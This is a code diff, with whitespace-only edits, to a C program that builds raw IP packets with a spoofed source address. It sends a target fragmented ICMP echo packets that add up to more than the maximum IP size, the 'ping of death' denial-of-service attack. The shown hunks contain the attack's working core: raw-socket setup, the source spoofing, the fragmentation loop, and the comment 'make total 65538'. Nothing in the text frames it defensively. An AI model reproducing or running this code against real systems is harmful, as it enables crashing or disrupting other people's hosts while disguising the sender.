@@ -68,13 +68,13 @@ int main(int argc,char** argv,char** envp) {
 		CHECK_NOT_M1(s=socket(AF_INET, SOCK_RAW, IPPROTO_RAW));
 		/* socket options, tell the kernel we provide the IP structure */
 		CHECK_NOT_M1(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)));
-		if((hp=gethostbyname(argv[2])) == NULL) {
+		if((hp=gethostbyname(argv[2]))==NULL) {
 			CHECK_NOT_M1(ip->ip_dst.s_addr=inet_addr(argv[2]));
 		} else
 			bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
 
 		/* The following source address just redundant for target to collect */
-		if((hp2=gethostbyname(argv[1])) == NULL) {
+		if((hp2=gethostbyname(argv[1]))==NULL) {
 			CHECK_NOT_M1(ip->ip_src.s_addr=inet_addr(argv[1]));
 		} else
 			bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
@@ -98,10 +98,10 @@ int main(int argc,char** argv,char** envp) {
 		/* Header checksum */
 		icmp->checksum=htons(~(ICMP_ECHO << 8));
 
-		for(offset=0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip))) {
+		for(offset=0; offset < 65536; offset+=(sizeof(buf) - sizeof(*ip))) {
 			ip->ip_off=htons(offset >> 3);
 			if(offset < 65120)
-				ip->ip_off |= htons(0x2000);
+				ip->ip_off|=htons(0x2000);
 			else
 				ip->ip_len=htons(418); /* make total 65538 */
 			/* sending time */
@@ -109,7 +109,7 @@ int main(int argc,char** argv,char** envp) {
 			printf("sendto() is OK.\n");
 
 			/* IF offset=0, define our ICMP structure */
-			if(offset == 0) {
+			if(offset==0) {
 				icmp->type=0;
 				icmp->code=0;
 				icmp->checksum=0;
